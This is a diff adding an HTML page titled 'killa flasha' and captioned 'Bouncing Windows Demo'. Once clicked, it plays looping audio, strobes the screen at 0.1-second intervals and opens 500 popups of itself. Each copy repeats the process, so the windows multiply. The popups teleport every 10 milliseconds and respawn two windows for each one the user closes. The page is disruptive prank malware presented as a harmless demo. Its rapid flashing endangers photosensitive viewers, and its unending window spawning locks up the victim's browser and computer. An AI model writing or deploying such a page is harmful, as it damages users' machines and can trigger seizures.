@@ -1,0 +1,182 @@
+<html>
+<head>
+    <title>killa flasha</title>
+    <style>
+        body {
+            background: black;
+            color: white;
+            text-align: center;
+            font-family: Arial;
+            margin: 0;
+            overflow: hidden;
+            animation: flash 0.1s linear infinite;
+        }
+        @keyframes flash {
+            0% { background: black; }
+            50% { background: white; }
+            100% { background: black; }
+        }
+        body.invert {
+            background: white !important;
+        }
+        #message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 48px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="message" onclick="startShow()">Bouncing Windows Demo</div>
+    <script>
+        let windows = [];
+        const WIDTH = 200;
+        const HEIGHT = 150;
+        const numWindows = 500;
+        let isRainbow = true;
+
+        function startShow() {
+            document.getElementById('message').style.display = 'none';
+            createWindows();
+            playAudio();
+            // Add keypress listener for window duplication
+            document.addEventListener('keydown', duplicateRandomWindow);
+        }
+
+        function duplicateWindow(sourceWindow) {
+            let x = sourceWindow.win.screenX;
+            let y = sourceWindow.y;
+            let features = `width=${WIDTH},height=${HEIGHT},left=${x},top=${y}`;
+            let win = window.open(window.location.href, '_blank', features);
+            if (win) {
+                windows.push({
+                    win: win,
+                    dx: sourceWindow.dx,
+                    dy: sourceWindow.dy,
+                    y: y,
+                    bounceCount: 0
+                });
+            }
+        }
+
+        function duplicateRandomWindow() {
+            if (windows.length > 0) {
+                const randomWindow = windows[Math.floor(Math.random() * windows.length)];
+                duplicateWindow(randomWindow);
+            }
+        }
+
+        function teleportWindows() {
+            for(let w of windows) {
+                let randomX = Math.floor(Math.random() * (window.screen.width - WIDTH));
+                let randomY = Math.floor(Math.random() * (window.screen.height - HEIGHT));
+                w.win.moveTo(randomX, randomY);
+                w.y = randomY;
+            }
+        }
+
+        function createWindows() {
+            for(let i = 0; i < numWindows; i++) {
+                let randomX = Math.floor(Math.random() * (window.screen.width - WIDTH));
+                let randomY = Math.floor(Math.random() * (window.screen.height - HEIGHT));
+                let features = `width=${WIDTH},height=${HEIGHT},left=${randomX},top=${randomY}`;
+                let win = window.open(window.location.href, '_blank', features);
+                if(win) {
+                    windows.push({
+                        win: win,
+                        dx: 5 + Math.random() * 10,
+                        dy: 5 + Math.random() * 10,
+                        y: randomY
+                    });
+                }
+            }
+            moveWindows();
+            // Start teleportation interval
+            setInterval(teleportWindows, 10);
+            // Start color inversion interval
+            setInterval(() => {
+                document.body.style.background = document.body.style.background === 'white' ? 'black' : 'white';
+            }, 2000);
+        }
+
+        const rainbowColors = ['#FF0000', '#FF7F00', '#FFFF00', '#00FF00', '#0000FF', '#4B0082', '#8F00FF'];
+        const bwColors = ['#000000', '#FFFFFF'];
+        let colorIndex = 0;
+
+        function moveWindows() {
+            const closedWindows = windows.filter(w => w.win.closed);
+            windows = windows.filter(w => !w.win.closed);
+            
+            // Spawn two new windows for each closed window
+            closedWindows.forEach(w => {
+                for(let i = 0; i < 2; i++) {
+                    let randomX = Math.floor(Math.random() * (window.screen.width - WIDTH));
+                    let randomY = Math.floor(Math.random() * (window.screen.height - HEIGHT));
+                    let features = `width=${WIDTH},height=${HEIGHT},left=${randomX},top=${randomY}`;
+                    let newWin = window.open(window.location.href, '_blank', features);
+                    if(newWin) {
+                        windows.push({
+                            win: newWin,
+                            dx: 5 + Math.random() * 10,
+                            dy: 5 + Math.random() * 10,
+                            y: randomY,
+                            bounceCount: 0
+                        });
+                    }
+                }
+            });
+
+            for(let i = 0; i < windows.length; i++) {
+                let w = windows[i];
+                try {
+                    let x = w.win.screenX;
+                    w.y += w.dy;  // Update y position manually
+
+                    // Bounce off screen edges with speed change
+                    if(x <= 0 || x >= window.screen.width - WIDTH) {
+                        w.dx *= -1;
+                        // Toggle between 40 and 20 speed
+                        let speed = Math.abs(w.dx);
+                        w.dx = (speed >= 40 ? 20 : 40) * (w.dx > 0 ? 1 : -1);
+                        isRainbow = !isRainbow;
+                        w.bounceCount = (w.bounceCount || 0) + 1;
+                        if (w.bounceCount % 10 === 0) duplicateWindow(w);
+                    }
+                    if(w.y <= 0 || w.y >= window.screen.height - HEIGHT) {
+                        w.dy *= -1;
+                        // Toggle between 40 and 20 speed
+                        let speed = Math.abs(w.dy);
+                        w.dy = (speed >= 40 ? 20 : 40) * (w.dy > 0 ? 1 : -1);
+                        w.y = w.y <= 0 ? 0 : window.screen.height - HEIGHT;
+                        isRainbow = !isRainbow;
+                    }
+
+                    // Update window position
+                    w.win.moveTo(x + w.dx, w.y);
+
+                    // Update colors with rapid rainbow effect
+                    const hue = (Date.now() * 5) % 360;
+                    w.win.document.body.style.background = `hsl(${hue}, 100%, 50%)`;
+                    w.win.document.body.style.transition = 'background 0.1s';
+
+                } catch(e) {
+                    // Handle any security exceptions
+                }
+            }
+
+            if(windows.length > 0) {
+                requestAnimationFrame(moveWindows);
+            }
+        }
+
+        function playAudio() {
+            let audio = new Audio('data:audio/wav;base64,//uQxAAAAAAAAAAAAAAAAAAAAAAASW5mbwAAAA8AAAADAAAGhgBVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr///////////////////////////////////////////8AAAA5TEFNRTMuOTlyAc0AAAAAAAAAABSAJAOkQgAAgAAABobXqlfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//uQxAAAE3l9ItPYAAAAAL/AAAAAAT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09');
+            audio.loop = true;
+            audio.play();
+        }
+    </script>
+</body>
+</html>
